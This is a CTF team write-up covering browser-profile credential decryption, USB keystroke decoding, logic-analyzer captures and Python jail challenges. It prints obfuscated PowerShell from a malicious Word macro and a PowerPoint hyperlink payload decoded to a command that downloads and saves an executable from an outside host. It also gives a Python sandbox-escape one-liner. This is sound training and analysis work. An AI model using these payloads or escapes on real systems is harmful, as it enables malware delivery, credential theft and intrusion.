       18  2021-04-13 01:01   fini/shield-preference-experiments.json
     1108  2021-04-13 20:34   fini/SiteSecurityServiceState.txt
     4096  2021-04-13 01:01   fini/storage.sqlite
       50  2021-04-13 01:01   fini/times.json
    32768  2021-04-13 01:01   fini/webappsstore.sqlite
    32768  2021-04-13 20:24   fini/webappsstore.sqlite-shm
   163992  2021-04-13 19:55   fini/webappsstore.sqlite-wal
      140  2021-04-13 01:11   fini/xulstore.json
---------                     -------
 16743139                     36 files

```

Ok, now we got a valid ZIP. The directory looks like a browsers session/profile data. This contains sensitive files such as `cert9.db`, `key4.db` and `logins.json`.

Here is a good read how Mozilla deals with storage and encryption of credentials. 
	- https://apr4h.github.io/2019-12-20-Harvesting-Browser-Credentials/#mozilla-firefox

Attempt decrypting the files with:
	- https://github.com/unode/firefox_decrypt
```sh
$ ~/tools/firefox_decrypt/firefox_decrypt.py .
2021-04-21 22:07:02,712 - WARNING - profile.ini not found in .
2021-04-21 22:07:02,712 - WARNING - Continuing and assuming '.' is a profile location

Website:   https://rabbitmq.makelarid.es
Username: 'Frank_B'
Password: 'CHTB{long_time_no_s33_icmp}'
```

#### Flag
CHTB{long_time_no_s33_icmp}

----

### ~~Key Mission~~
*sanre*
Easy - Forensics

The secretary of earth defense has been kidnapped. We have sent our elite team on the enemy's base to find his location. Our team only managed to intercept this traffic. Your mission is to retrieve secretary's hidden location.

#### USBPcap
Articles regarding decoding some bits from the usb.capdata!
	- https://bitvijays.github.io/LFC-Forensics.html

#### Data
Keyboard Report Format

    Byte 0: Keyboard modifier bits (SHIFT, ALT, CTRL etc)
    Byte 1: reserved
    Byte 2-7: Up to six keyboard usage indexes representing the keys that are currently “pressed”. Order is not important, a key is either pressed (present in the buffer) or not pressed.

See: https://hackmd.io/@o7feX9hfREaSegDAEu2cAw/SkJumBtmU

#### HID Keymap (page 53)
To manually add missing keycodes to existing solutions:
	- https://usb.org/sites/default/files/documents/hut1_12v2.pdf


#### Solve
```sh
tshark -2 -r key_mission.pcap -T fields -e usb.capdata frame.len==72 and usb.transfer_type == 0x01 |tee keypresses.txt

python map-keys.py keypresses.txt 
Ispaceamspacesendingspacesecretary'sspacelocationspaceoverspacethisspacetotallyspaceencryptedspacechannelspacetospacemakespacesurespacenospaceonespaceelsespacewillspacebespaceablespacetospacereadspaceitspaceexceptspaceofspaceus.spaceThisspaceinformationspaceisspaceconfidentialspaceandspacemustspacenotspacebespacesharedspacewithspaceanyonespaceelse.spaceThespacesecretary'sspacehiddenspacelocationspaceisspaceCHTB{a_plac3_fAr_fAr_away_fr0m_eaedelrth}
```

#### Flag
CHTB{a_plac3_fAr_fAr_away_fr0m_earth}

#### Solving script
```py
#!/usr/bin/python
# coding: utf-8
from __future__ import print_function
import sys,os

#declare -A lcasekey
lcasekey = {}
#declare -A ucasekey
ucasekey = {}

#associate USB HID scan codes with keys
#ex: key 4  can be both "a" and "A", depending on if SHIFT is held down
lcasekey[4]="a";           ucasekey[4]="A"
lcasekey[5]="b";           ucasekey[5]="B"
lcasekey[6]="c";           ucasekey[6]="C"
lcasekey[7]="d";           ucasekey[7]="D"
lcasekey[8]="e";           ucasekey[8]="E"
lcasekey[9]="f";           ucasekey[9]="F"
lcasekey[10]="g";          ucasekey[10]="G"
lcasekey[11]="h";          ucasekey[11]="H"
lcasekey[12]="i";          ucasekey[12]="I"
lcasekey[13]="j";          ucasekey[13]="J"
lcasekey[14]="k";          ucasekey[14]="K"
lcasekey[15]="l";          ucasekey[15]="L"
lcasekey[16]="m";          ucasekey[16]="M"
lcasekey[17]="n";          ucasekey[17]="N"
lcasekey[18]="o";          ucasekey[18]="O"
lcasekey[19]="p";          ucasekey[19]="P"
lcasekey[20]="q";          ucasekey[20]="Q"
lcasekey[21]="r";          ucasekey[21]="R"
lcasekey[22]="s";          ucasekey[22]="S"
lcasekey[23]="t";          ucasekey[23]="T"
lcasekey[24]="u";          ucasekey[24]="U"
lcasekey[25]="v";          ucasekey[25]="V"
lcasekey[26]="w";          ucasekey[26]="W"
lcasekey[27]="x";          ucasekey[27]="X"
lcasekey[28]="y";          ucasekey[28]="Y"
lcasekey[29]="z";          ucasekey[29]="Z"
lcasekey[30]="1";          ucasekey[30]="!"
lcasekey[31]="2";          ucasekey[31]="@"
lcasekey[32]="3";          ucasekey[32]="#"
lcasekey[33]="4";          ucasekey[33]="$"
lcasekey[34]="5";          ucasekey[34]="%"
lcasekey[35]="6";          ucasekey[35]="^"
lcasekey[36]="7";          ucasekey[36]="&"
lcasekey[37]="8";          ucasekey[37]="*"
lcasekey[38]="9";          ucasekey[38]="("
lcasekey[39]="0";          ucasekey[39]=")"
lcasekey[40]="Enter";      ucasekey[40]="Enter"
lcasekey[41]="esc";        ucasekey[41]="esc"
lcasekey[42]="del";        ucasekey[42]="del"
lcasekey[43]="tab";        ucasekey[43]="tab"
lcasekey[44]="space";      ucasekey[44]="space"
lcasekey[45]="-";          ucasekey[45]="_"
lcasekey[46]="=";          ucasekey[46]="+"
lcasekey[47]="[";          ucasekey[47]="{"
lcasekey[48]="]";          ucasekey[48]="}"
lcasekey[49]="\\";         ucasekey[49]="|"
lcasekey[50]=" ";          ucasekey[50]=" "
lcasekey[51]=";";          ucasekey[51]=":"
lcasekey[52]="'";          ucasekey[52]="\""
lcasekey[53]="`";          ucasekey[53]="~"
lcasekey[54]=",";          ucasekey[54]="<"
lcasekey[55]=".";          ucasekey[55]=">"
lcasekey[56]="/";          ucasekey[56]="?"
lcasekey[57]="CapsLock";   ucasekey[57]="CapsLock"
lcasekey[79]="RightArrow"; ucasekey[79]="RightArrow"
lcasekey[80]="LeftArrow";  ucasekey[80]="LeftArrow"
lcasekey[84]="/";          ucasekey[84]="/"
lcasekey[85]="*";          ucasekey[85]="*"
lcasekey[86]="-";          ucasekey[86]="-"
lcasekey[87]="+";          ucasekey[87]="+"
lcasekey[88]="Enter";      ucasekey[88]="Enter"
lcasekey[89]="1";          ucasekey[89]="1"
lcasekey[90]="2";          ucasekey[90]="2"
lcasekey[91]="3";          ucasekey[91]="3"
lcasekey[92]="4";          ucasekey[92]="4"
lcasekey[93]="5";          ucasekey[93]="5"
lcasekey[94]="6";          ucasekey[94]="6"
lcasekey[95]="7";          ucasekey[95]="7"
lcasekey[96]="8";          ucasekey[96]="8"
lcasekey[97]="9";          ucasekey[97]="9"
lcasekey[98]="0";          ucasekey[98]="0"
lcasekey[99]=".";          ucasekey[99]="."

#make sure filename to open has been provided
if len(sys.argv) == 2:
	keycodes = open(sys.argv[1])
	for line in keycodes:
		#dump line to bytearray
		bytesArray = bytearray.fromhex(line.strip())
		#see if we have a key code
		val = int(bytesArray[2])
		if val > 3 and val < 100:
			#see if left shift or right shift was held down
			if bytesArray[0] == 0x02 or bytesArray[0] == 0x20 :
				print(ucasekey[int(bytesArray[2])], end=''),  #single line output
				#print(ucasekey[int(bytesArray[2])])            #newline output
			else:
				print(lcasekey[int(bytesArray[2])], end=''),  #single line output
				#print(lcasekey[int(bytesArray[2])])            #newline output
else:
    print("USAGE: python %s [filename]" % os.path.basename(__file__))
```

### ~~Invitation~~
*Antti*, *sanre*

Forensics - Easy

Last night I recieved an invitation, but after I accepted, some wierd things happend in my computer.

Word macrot

VBAn voi extractaa: <https://github.com/decalage2/oletools/wiki/olevba>

Encoded command: <https://haste.antti.codes/omokevozav>
Decoded command: <https://haste.antti.codes/polefitola>


#### Enum
Malicious .docm is received. Unzip the .docm and inspect the file-structure:
```
[zip] $ tree
.
├── [Content_Types].xml
├── docProps
│   ├── app.xml
│   └── core.xml
├── invite.zip
├── _rels
└── word
    ├── document.xml
    ├── fontTable.xml
    ├── media
    │   └── image1.png
    ├── _rels
    │   ├── document.xml.rels
    │   └── vbaProject.bin.rels
    ├── settings.xml
    ├── styles.xml
    ├── theme
    │   └── theme1.xml
    ├── vbaData.xml
    ├── vbaProject.bin
    └── webSettings.xml

6 directories, 15 files
```

Quite usual .docm file. Lets see if `olevba` has something to say if there are any vba scripts, as the `vbaProject.bin` file hints.

#### Deobfuscation
olevba -> hex decode -> b64 decode
This leaves us with dot-obfuscation. 

Remove every second "." in vim.
	- Record macro with `q+<char>`
	- Save macro with `q`
	- Run macro n times with `n+@+<char>`



Interesting bits:
```
. ( $PshomE[4]+$pshoMe[30]+'x') ( [strinG]::join('' , ([REGeX]::MaTCHES( ")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(" ,'.' ,'R'+'iGHTtOl'+'eft' ) | FoREaCH-OBJecT {$_.VALUE} ))  ).

SEt ("G8"+"h")  (  " ) )63]Rahc[,'raZ'EcalPeR-  43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}atem_we'+'n_eht'+'_2N1 = n'+'gerr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . "  ) ;-jOIn ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue[ - 1.. - ( ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue.LengtH)] | IeX .
```

Then run those in powershell and notice the flag is there!

CHTB{maldocs_are_the_new_meta}


### ~~Alienphish~~
*sanre*
Forensics - Easy

This PowerPoint presentation was sent to the top leadership of the human resistance effort. We believe it was an attempt by the aliens to phish into our networks. Find the malicious payload and the flag.


#### Intro
PPSX malware.

Read more:
	- https://www.bleepingcomputer.com/news/security/powerpoint-file-downloads-malware-when-you-hover-a-link-no-macros-required/
	- https://www.trendmicro.com/en_us/research/17/h/cve-2017-0199-new-malware-abuses-powerpoint-slide-show.html

Common IOC search:
	`grep -r "Target=" . --color`

#### File structure
```sh
[zip] $ tree        
.                                
├── a.zip                            
├── [Content_Types].xml              
├── docProps                                   
│   ├── app.xml                               
│   ├── core.xml                     
│   └── thumbnail.jpeg               
├── ppt                                                                                           
│   ├── media                                                                                     
│   │   ├── image1.png                                                                            
│   │   └── image2.png                                                                            
│   ├── presentation.xml                                                                          
│   ├── presProps.xml                                                                             
│   ├── _rels                                                                                     
│   │   └── presentation.xml.rels                                                                 
│   ├── slideLayouts                                                                              
│   │   ├── _rels                                                                                 
│   │   │   ├── slideLayout10.xml.rels                                                            
│   │   │   ├── slideLayout11.xml.rels                                                            
│   │   │   ├── slideLayout1.xml.rels                                                             
│   │   │   ├── slideLayout2.xml.rels           
│   │   │   ├── slideLayout3.xml.rels           
│   │   │   ├── slideLayout4.xml.rels           
│   │   │   ├── slideLayout5.xml.rels           
│   │   │   ├── slideLayout6.xml.rels           
│   │   │   ├── slideLayout7.xml.rels           
│   │   │   ├── slideLayout8.xml.rels           
│   │   │   └── slideLayout9.xml.rels           
│   │   ├── slideLayout10.xml                   
│   │   ├── slideLayout11.xml                   
│   │   ├── slideLayout1.xml                                                                      
│   │   ├── slideLayout2.xml         
│   │   ├── slideLayout3.xml         
│   │   ├── slideLayout4.xml         
│   │   ├── slideLayout5.xml          
│   │   ├── slideLayout6.xml         
│   │   ├── slideLayout7.xml         
│   │   ├── slideLayout8.xml         
│   │   └── slideLayout9.xml                     
│   ├── slideMasters                 
│   │   ├── _rels
│   │   │   └── slideMaster1.xml.rels
│   │   └── slideMaster1.xml                                                                                                                                                                         
│   ├── slides                                             
│   │   ├── _rels                                          
│   │   │   └── slide1.xml.rels                            
│   │   └── slide1.xml                                     
│   ├── tableStyles.xml                                    
│   ├── theme                                              
│   │   └── theme1.xml                                     
│   └── viewProps.xml                                      
└── _rels 
```

#### IOC 
See link `Target`

```
[zip] $ grep -ir cmd .
./ppt/slides/_rels/slide1.xml.rels:<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="cmd.exe" TargetMode="External"/></Relationships>
```
ref. PPSX malware - https://www.bleepingcomputer.com/news/security/powerpoint-file-downloads-malware-when-you-hover-a-link-no-macros-required/

```
cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22
```

#### Decoding
URL-decode
```
cmd.exe /V:ON/C"set yM="o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'   pmet:vne$ = o$" c- llehsrewop&&for /L %X in (122;-1;0)do set kCX=!kCX!!yM:~%X,1!&&if %X leq 0 call %kCX:*kCX!=%"
```

Notice that `o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'   pmet:vne$ = o$" c- llehsrewop` is reversed

```sh
$ echo "o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'   pmet:vne$ = o$\" c- llehsrewop" |rev
powershell -c "$o = $env:temp   'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe'; iwr http:/destroyearth.alien/x.exe -outfile $o
```

**Part of the flag**
```
[alienphish] $ echo "Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99" |base64 -d
CHTB{pH1sHiNg_w0_m4cr0sbase64: invalid input
```

The first and second parts of the b64 around the `_`-character look like balid b64, so probably the `_` should be changed to fix the b64 standards.

```
echo "Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM/Pz99" |base64 -d
CHTB{pH1sHiNg_w0_m4cr0s???}
```

#### Flag
CHTB{pH1sHiNg_w0_m4cr0s???}

## Hardware

### ~~Serial Logs~~
*Pingnu*

Sal file contains two data channels. 0 contains no data. 1 is aynchronous serial data.

#### How to analyze
1. Open .sal file in [saleae Logic 2](https://www.saleae.com/downloads/)
2. Go to "Analyzers"
3. Click on "Async Serial"
4. Set baud rate (Bits/s) to 115200 (default baud rate for raspi serial)
5. Press save
6. Press on the terminal icon

Starts with:
```
[LOG] Connection from 4b1186d29d6b97f290844407273044e5202ddf8922163077b4a82615fdb22376
< ... >
LOG] Connection from 4b1186d29d6b97f290844407273044e5202ddf8922163077b4a82615fdb22376
[ERR] Noise detected in channel. Swithcing baud to backup value
```
After which comes binary data (different baud rate)
Yes the logs have a typo.

After some testing the settings worked:
baud rate: 74000 -ish
bits/frame: 9 (+ 1 stop bit)

#### Flag
```CHTB{wh47?!_f23qu3ncy_h0pp1n9_1n_4_532141_p2070c01?!!!52```

### ~~Compromised~~
*Pingnu*

#### How to analyze
1. Open .sal file in [saleae Logic 2](https://www.saleae.com/downloads/)
2. Go to "Analyzers"
3. Click on "I2C"
4. Install "printf parse text to terminal" in extensions tab
5. Add it as an analyzer

The printf analyzer gives back this string: ```set_maCxH_lTimB{itn_tuo1:110_se73t_2mimn1_nli4mi70t_2to5:3M2B14B1dV_5 yS5B7k31VQxm!j@`Q52yq)t%# @5%md}```

It seems like the flag is mixed with a command that starts with ```set_max_limit```

Command data is sent to address 0x34.
Flag data is sent to address 0x2C.

Export data as CSV -> have a program separate the data

```python
import csv

flag = []

with open ('data.csv') as data_file:
    data = csv.reader(data_file, delimiter=',')
    read = False
    for row in data:
        if read:
            flag.append(row[4])
            read = False
        if row[6] == '0x2C':
            read = True

for char in flag:
    print(bytes.fromhex(char[2:]).decode('ASCII'), end = '')
```

#### Flag
```CHTB{nu11_732m1n47025_c4n_8234k_4_532141_5y573m!@52)#@%}```

### ~~Secure~~
*Pingnu* *Sanduuz*

#### How to analyze
1. Open .sal file in [saleae Logic 2](https://www.saleae.com/downloads/)
2. Go to "Analyzers"
3. Analyze as SPI:
- MOSI : C0
- MISO : C1
- Clock : C3
- Enable : C2
4. Open "Terminal"
5. Copy all data and decode from hex

The flag is hidden in the data:
```ÿCÿHÿTÿBÿPÿ1ÿ_ÿ1ÿ5ÿ_ÿmÿmÿ0ÿnÿ_ÿ0ÿmÿ3ÿmÿ0ÿ2ÿyÿ3ÿvÿ1ÿcÿ3ÿ5ÿ@ÿ5ÿ2ÿ}ÿ```
Remove every second character to get the flag.

#### Flag
```CHTB{5P1_15_c0mm0n_0n_m3m02y_d3v1c35_!@52}```

### Off the Grid
*Pingnu*

Channels are data sent to small OLED screen.
Schematics in png which comes in the zip.

#### Pins

> **Channel 0**
> Pin: DIN
> Function: Data transfer
> Notes:
> * Bit lenght: 800 ns
> * Baud rate: 1250000
> * Signal is inverted
> 
> **Channel 1**
> Pin: CLK
> Function: Clock
> Notes: 400 ns pulses - half of the bit length of DIN.
> 
> **Channel 2**
> Pin: CS
> Function: Chip select
> Notes: May not be important for solving.
> 
> **Channel 3**
> Pin D/C
> Function: Power?
> Notes: May not be important for solving.
> 
> **Channel 4**
> Pin: RES
> Function: Reset
> Notes: Is not important for solving
> 
> **Channel 5**
> Unused

#### Other notes


## Misc

### ~~Alien Camp~~
*Pingnu*

Ratkaistu python-spagetilla:
VAROITUS: tulostaa kaikki 500 kysymystä.
```python
import socket
from time import sleep

HOST = '127.0.0.1'
PORT = 12345

question = 1

vals = {}

def get_vals():
    data = s.recv(1024).decode('utf-8')

    start = data.find('Here is a little help:\n')
    end = data.find('\n1.')

    unparsed = data[start+23:end]

    parsed_list = unparsed.split()
    while '->' in parsed_list:
        parsed_list.remove('->')

    for i in range(0, len(parsed_list), 2):
        vals[parsed_list[i]] = parsed_list[i+1]

def parse(question):
    data = s.recv(1024).decode('utf-8')

    start = data.find('Question')
    end = data.find(' = ?')

    if not start or not end:
        print('Error: no question found!')

    calculation = data[start+12+len(str(question)):end]
    print(calculation)

    for emoji in vals:
        parsed = calculation.replace(emoji, str(vals[emoji]))
        calculation = parsed

    response = (str(eval(calculation)) + '\n').encode('utf-8')

    print(question, ':', calculation)

    return question + 1, response

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.recv(1024)

    s.sendall(b'1\n')
    sleep(1)
    get_vals()

    s.sendall(b'2\n')

    while True:
        question, response = parse(question)
        s.sendall(response)

```

#### Flag
```CHTB{3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3}```

### ~~Input As A Service~~

Avaa selaimes, tulee GET is not defined.
Ottaa siis vastaan tcp yhteyden ja evalaa sen.
Netcatil voi yhistää ja sitten suorittaa pythonia.
Jotain filteröintiä on

```python
print(open("flag.txt", "r").read())
```

CHTB{4li3n5_us3_pyth0n2.X?!}

### ~~Build yourself in~~
*Pingnu, Antti*

Filtered python console.
User input is ran with
```python
exec(text, {'__builtins__': None, 'print':print}
```
where ```text``` is the input
**No quotes allowed.**

Code to print contents of ```flag.txt``` without using quotes (python 2 and 3 both work):
```python
foo = str(0)
bar = foo[1:]
filename = bar.join([chr(c) for c in [102, 108, 97, 103, 46, 116, 120, 116]])
print(open(filename).read())
```
Works on my machine™. The server however does not run the code. Line 1 returns this:
```
>>> print(foo)
Traceback (most recent call last):
  File "/app/build_yourself_in.py", line 16, in <module>
    main()
  File "/app/build_yourself_in.py", line 13, in main
    exec(text, {'__builtins__': None, 'print':print})
  File "<string>", line 1, in <module>
TypeError: 'NoneType' object is not subscriptable
```

Solution that actually works by Antti.
Basicly the code above but bypasses the fact that builtins is None by using `print.__self__`
```py
print(print.__self__.open(print.__self__.str().join([print.__self__.chr(c) for c in [102, 108, 97, 103, 46, 116, 120, 116]])).read())
```

#### Flag
CHTB{n0_j4il_c4n_h4ndl3_m3!}
